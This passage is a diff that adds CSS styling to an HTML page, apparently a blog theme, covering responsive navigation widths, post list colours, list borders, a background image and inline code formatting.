+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/img/article-list-bg.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+    .post .pjax article :not(pre) > code {
+        color: #24292e;
+        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+        background-color: rgba(27,31,35,.05);
+        border-radius: 3px;
+        font-size: 85%;
+        margin: 0;
+        padding: .2em .4em;
+    }
+    
+</style>
+
+
+
+
+
+
+
+</html>
